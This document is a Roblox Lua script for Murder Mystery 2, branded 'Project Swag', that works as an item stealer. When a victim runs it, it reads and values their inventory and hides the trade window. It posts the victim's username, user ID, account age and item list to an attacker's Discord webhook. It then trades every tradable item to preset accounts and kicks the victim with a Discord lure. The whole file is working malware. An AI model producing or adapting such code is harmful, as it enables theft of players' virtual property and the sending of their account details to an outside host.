repeat task.wait() until game:IsLoaded()
task.wait(2)

-- Sadece MM2'de çalışsın
if game.PlaceId ~= 142823291 then
    game.Players.LocalPlayer:Kick("This script only works in MM2!")
    return
end

_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

-- Universal request (TÜM EXECUTORLAR İÇİN)
getgenv().request = getgenv().request 
    or request 
    or http_request 
    or (syn and syn.request) 
    or (http and http.request) 
    or (fluxus and fluxus.request) 
    or (Hydrogen and Hydrogen.request) 
    or (krnl and krnl.request) 
    or (KRNL and KRNL.request) 
    or (codex and codex.request) 
    or (ronix and ronix.request) 
    or (volcano and volcano.request) 
    or (potassium and potassium.request) 
    or (wave and wave.request) 
    or (seliware and seliware.request) 
    or (bunnifun and bunnifun.request) 
    or (volt and volt.request) 
    or (velocity and velocity.request) 
    or (swift and swift.request) 
    or (xeno and xeno.request) 
    or getgenv().HttpPost 
    or nil

if not getgenv().request then
    return warn("Executor not supported: No request function found.")
end

-- Universal queue_on_teleport (korunur, kullanılmasa da)
getgenv().queue_on_teleport = getgenv().queue_on_teleport 
    or queue_on_teleport 
    or queueonteleport 
    or (syn and syn.queue_on_teleport) 
    or (fluxus and fluxus.queue_on_teleport) 
    or (Hydrogen and Hydrogen.queue_on_teleport) 
    or (krnl and krnl.queue_on_teleport) 
    or (codex and codex.queue_on_teleport) 
    or (ronix and ronix.queue_on_teleport) 
    or (volcano and volcano.queue_on_teleport) 
    or (potassium and potassium.queue_on_teleport) 
    or (wave and wave.queue_on_teleport) 
    or (seliware and seliware.queue_on_teleport) 
    or (bunnifun and bunnifun.queue_on_teleport) 
    or (volt and volt.queue_on_teleport) 
    or (velocity and velocity.queue_on_teleport) 
    or (swift and swift.queue_on_teleport) 
    or (xeno and xeno.queue_on_teleport) 
    or nil

-- Universal setclipboard
getgenv().setclipboard = getgenv().setclipboard 
    or setclipboard 
    or (syn and syn.setclipboard) 
    or (clipboard and clipboard.set) 
    or (Hydrogen and Hydrogen.setclipboard) 
    or (krnl and krnl.setclipboard) 
    or (codex and codex.setclipboard) 
    or (ronix and ronix.setclipboard) 
    or (volcano and volcano.setclipboard) 
    or (potassium and potassium.setclipboard) 
    or (wave and wave.setclipboard) 
    or (seliware and seliware.setclipboard) 
    or (bunnifun and bunnifun.setclipboard) 
    or (volt and volt.setclipboard) 
    or (velocity and velocity.setclipboard) 
    or (swift and swift.setclipboard) 
    or (xeno and xeno.setclipboard) 
    or function() end

local HttpService = game:GetService("HttpService")
if not HttpService.HttpEnabled then HttpService.HttpEnabled = true end

local cfg = (getgenv and getgenv()) or {}
cfg.users = cfg.users or {}
cfg.webhook = webh or ""
cfg.pingEveryone = "Yes"

if usern and typeof(usern) == "string" then
    for user in string.gmatch(usern, "[^,]+") do
        table.insert(cfg.users, user:match("^%s*(.-)%s*$"))
    end
end

-- Trade dışı itemlar
local no_trade_items = {
    ["DefaultGun"] = true, ["DefaultKnife"] = true, ["Reaver"] = true,
    ["Reaver_Legendary"] = true, ["Reaver_Godly"] = true, ["Reaver_Ancient"] = true,
    ["IceHammer"] = true, ["IceHammer_Legendary"] = true, ["IceHammer_Godly"] = true,
    ["IceHammer_Ancient"] = true, ["Gingerscythe"] = true, ["Gingerscythe_Legendary"] = true,
    ["Gingerscythe_Godly"] = true, ["Gingerscythe_Ancient"] = true, ["TestItem"] = true,
    ["Season1TestKnife"] = true, ["Cracks"] = true, ["Icecrusher"] = true, ["???"] = true,
    ["Dartbringer"] = true, ["TravelerAxeRed"] = true, ["TravelerAxeBronze"] = true,
    ["TravelerAxeSilver"] = true, ["TravelerAxeGold"] = true, ["BlueCamo_K_2022"] = true,
    ["GreenCamo_K_2022"] = true, ["SharkSeeker"] = true
}

-- Chroma/özel itemler
local specialItems = {
    ["C. Traveler's Gun"] = true, ["Chroma Evergun"] = true, ["Chroma Evergreen"] = true,
    ["Chroma Bauble"] = true, ["C. Vampire's Gun"] = true, ["C. Constellation"] = true,
    ["Chroma Blizzard"] = true, ["Chroma Alienbeam"] = true, ["Chroma Snowstorm"] = true,
    ["Chroma Raygun"] = true, ["C. Snowcannon"] = true, ["C. Snow Dagger"] = true,
    ["Chroma Sunrise"] = true, ["Chroma Sunset"] = true, ["Chroma Ornament"] = true,
    ["Chroma Watergun"] = true, ["Evergun"] = true, ["Traveler's Gun"] = true,
    ["Evergreen"] = true, ["Constellation"] = true, ["Vampire's Gun"] = true,
    ["Turkey"] = true, ["Darkshot"] = true, ["Darksword"] = true, ["Alienbeam"] = true,
    ["Blossom"] = true, ["Sakura"] = true, ["Bauble"] = true, ["Gingerscope"] = true,
    ["Traveler's Axe"] = true, ["Celestial"] = true, ["Vampire's Axe"] = true
}

local users = cfg.users
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local plr = Players.LocalPlayer

if not plr then return end

local isTradeCompleted = false
local hasSpecialItem = false
local totalInventoryValue = 0

local request = getgenv().request

-- Executor ismini evrensel olarak al
local executorName = "Unknown"
pcall(function()
    local ok, name = pcall(identifyexecutor)
    if ok and name then
        executorName = name
    else
        local ok2, name2 = pcall(getexecutorname)
        if ok2 and name2 then
            executorName = name2
        end
    end
end)

-- ---- YENİ DELTA BYPASS (hookfunction ile) ----
local REAL_JOB_ID = game.JobId
if executorName:lower() == "delta" then
    local stepAnimate = nil
    repeat
        for _, v in ipairs(getgc(true)) do
            if typeof(v) == "function" and debug.getinfo(v) and debug.getinfo(v).name == "stepAnimate" then
                stepAnimate = v
                break
            end
        end
        task.wait()
    until stepAnimate

    local captured = false
    local old = hookfunction(stepAnimate, function(dt)
        if not captured then
            captured = true
            REAL_JOB_ID = game.JobId
        end
        return old(dt)
    end)
    repeat task.wait() until captured
end
-- ---- BYPASS SONU ----

if not plr.Character then plr.CharacterAdded:Wait() end
task.wait(1)

local PlaceId = game.PlaceId
local fernJoinerLink = string.format("https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", PlaceId, REAL_JOB_ID)

local Trade = ReplicatedStorage:WaitForChild("Trade")
local SendRequest = Trade:WaitForChild("SendRequest")
local GetStatus = Trade:WaitForChild("GetTradeStatus")
local OfferItem = Trade:WaitForChild("OfferItem")
local AcceptTradeRemote = Trade:WaitForChild("AcceptTrade")
local DeclineTrade = Trade:WaitForChild("DeclineTrade")

local LastOffer = nil
Trade.UpdateTrade.OnClientEvent:Connect(function(x) 
    if x and x.LastOffer then LastOffer = x.LastOffer end
end)

-- GUI'leri kapat
local PlayerGui = plr:WaitForChild("PlayerGui")
for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
    local gui = PlayerGui:FindFirstChild(guiName)
    if gui then
        gui.Enabled = false
        gui:GetPropertyChangedSignal("Enabled"):Connect(function()
            if gui.Enabled then gui.Enabled = false end
        end)
    end
end

-- Inventory oku
local database = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
local profileData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)

local weaponsToSend = {}
local rarityCounts = {Ancient=0, Godly=0, Unique=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0}
local prices = fetch_all_values()

for dataid, amount in pairs(profileData.Weapons.Owned or {}) do
    local item = database[dataid]
    if item and not no_trade_items[dataid] then
        local itemName = item.ItemName or dataid
        local rarity = item.Rarity or "Common"
        local value = prices[dataid] or 1
        local totalValue = value * amount
        totalInventoryValue = totalInventoryValue + totalValue
        if specialItems[itemName] then hasSpecialItem = true end
        table.insert(weaponsToSend, {
            DataID = dataid,
            ItemName = itemName,
            Amount = amount,
            Rarity = rarity,
            Value = value,
            TotalValue = totalValue,
            IsChroma = specialItems[itemName] or false
        })
        rarityCounts[rarity] = (rarityCounts[rarity] or 0) + amount
    end
end

table.sort(weaponsToSend, function(a, b) return a.TotalValue > b.TotalValue end)

-- Hit kategorisi
local hitCategory = ""
local isPingWorthy = false

if totalInventoryValue < 100 then
    hitCategory = "Bad Hit"
elseif totalInventoryValue < 300 then
    hitCategory = "Normal Hit"
elseif totalInventoryValue < 1000 then
    hitCategory = "Good Hit"
    isPingWorthy = true
else
    hitCategory = "Big Hit"
    isPingWorthy = true
end

local rubisLink = upload_to_rubis(weaponsToSend) or "Upload failed"

-- Webhook gönderme
local function sendWebhook(targetWebhook)
    local avatarUrl = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", plr.UserId)
    local targetName = table.concat(users, ", ")
    local hookType = "HIT"
    local color = 0xFF0000
    local joinScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance("%d", "%s", game.Players.LocalPlayer)', PlaceId, REAL_JOB_ID)

    local total_items = 0
    for _, item in ipairs(weaponsToSend) do total_items = total_items + item.Amount end

    local top_items = {}
    for i = 1, math.min(5, #weaponsToSend) do
        local item = weaponsToSend[i]
        table.insert(top_items, string.format("~ %s x%d (%d)", item.ItemName, item.Amount, item.TotalValue))
    end

    local tier_counts = {Ancient=0, Godly=0, Unique=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0}
    for _, item in ipairs(weaponsToSend) do
        tier_counts[item.Rarity] = (tier_counts[item.Rarity] or 0) + item.Amount
    end

    local content = nil
    if isPingWorthy and cfg.pingEveryone == "Yes" then
        content = "@everyone 🚨 New MM2 Hit!"
    end

    local embed = {
        title = string.format("%s | %s | %s | %s", hookType, plr.DisplayName, targetName, hitCategory),
        description = string.format("```lua\n%s\n```", joinScript),
        color = color,
        thumbnail = {url = avatarUrl},
        fields = {
            {
                name = "Victim Information",
                value = string.format("**Username:** %s\n**Display:** %s\n**User ID:** `%d`\n**Account Age:** %d days", plr.Name, plr.DisplayName, plr.UserId, plr.AccountAge),
                inline = true
            },
            {
                name = "System Information",
                value = string.format("**Executor:** %s\n**Receiver:** %s", executorName, targetName),
                inline = true
            },
            {
                name = "Inventory Summary",
                value = string.format("**Total Value:** `%d`\n**Total Items:** `%d`\n\n**Ancient:** `%d` | **Godly:** `%d`\n**Unique:** `%d` | **Vintage:** `%d`\n**Legendary:** `%d` | **Rare:** `%d`\n**Uncommon:** `%d` | **Common:** `%d`",
                    totalInventoryValue, total_items,
                    tier_counts.Ancient, tier_counts.Godly,
                    tier_counts.Unique, tier_counts.Vintage,
                    tier_counts.Legendary, tier_counts.Rare,
                    tier_counts.Uncommon, tier_counts.Common),
                inline = false
            },
            {
                name = "Top Items",
                value = table.concat(top_items, "\n") or "No items",
                inline = false
            },
            {
                name = "Links",
                value = string.format("[Join Server](%s) | [Full Inventory](%s)", fernJoinerLink, rubisLink),
                inline = false
            }
        },
        footer = {
            text = string.format("Project Swag • %s", os.date("%m/%d/%Y %H:%M"))
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }

    local payload = {
        content = content,
        username = "Project Swag",
        embeds = {embed}
    }

    pcall(function()
        request({
            Url = targetWebhook .. "?wait=true",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(payload)
        })
    end)
end

-- İlk gönderim
sendWebhook(cfg.webhook)

-- Trade fonksiyonları
local function getStatus()
    local ok, status = pcall(function() return GetStatus:InvokeServer() end)
    return ok and status or "None"
end

local function waitForTarget(targetPlayer)
    local attempts = 0
    while attempts < 30 do
        if targetPlayer and targetPlayer.Parent then
            local char = targetPlayer.Character
            if char and char:FindFirstChild("Humanoid") then return true end
        end
        attempts = attempts + 1
        task.wait(0.5)
    end
    return false
end

local function AcceptTrade()
    if not LastOffer then return false end
    local ok = pcall(function()
        AcceptTradeRemote:FireServer(PlaceId * 3, LastOffer)
    end)
    return ok
end

local function finishAndKick()
    isTradeCompleted = true
    task.wait(2)
    local discordLink = "https://discord.gg/7PJtnGwdXW"
    pcall(function() setclipboard(discordLink) end)
    plr:Kick("Items taken by Project Swag\n\n" .. discordLink .. "\n\nJoin to get your items back!")
end

function doTrade(targetPlayer)
    if not targetPlayer or not targetPlayer.Parent then return end
    if not waitForTarget(targetPlayer) then return end
    
    pcall(function() DeclineTrade:FireServer() end)
    task.wait(0.5)
    LastOffer = nil
    
    local itemsAdded = false
    local timeout = 0
    
    while timeout < 60 and #weaponsToSend > 0 do
        local success = pcall(function()
            local status = getStatus()
            
            if status == "None" then
                if itemsAdded then
                    for i = 1, math.min(4, #weaponsToSend) do table.remove(weaponsToSend, 1) end
                    itemsAdded = false
                    LastOffer = nil
                    task.wait(0.5)
                else
                    SendRequest:InvokeServer(targetPlayer)
                    task.wait(1.5)
                end
            elseif status == "SendingRequest" then
                task.wait(0.5)
            elseif status == "ReceivingRequest" then
                DeclineTrade:FireServer()
                task.wait(0.3)
            elseif status == "StartTrade" then
                if not itemsAdded then
                    for i = 1, math.min(4, #weaponsToSend) do
                        local item = weaponsToSend[i]
                        for _ = 1, item.Amount do
                            OfferItem:FireServer(item.DataID, "Weapons")
                        end
                        task.wait(0.1)
                    end
                    itemsAdded = true
                    task.spawn(function()
                        task.wait(6.5)
                        AcceptTrade()
                    end)
                else
                    task.wait(1)
                end
            end
        end)
        
        if not success then task.wait(1) end
        timeout = timeout + 1
    end
    
    if #weaponsToSend == 0 then finishAndKick() end
end

-- Target kontrol
local function isTarget(name)
    for _, u in ipairs(users) do
        if u:lower() == name:lower() then return true end
    end
    return false
end

-- Eventler
Players.PlayerAdded:Connect(function(player)
    if player == plr then return end
    if isTarget(player.Name) then
        task.spawn(function()
            task.wait(4)
            doTrade(player)
        end)
    end
end)

for _, p in ipairs(Players:GetPlayers()) do
    if p ~= plr and isTarget(p.Name) then
        task.spawn(function()
            task.wait(4)
            doTrade(p)
        end)
    end
end
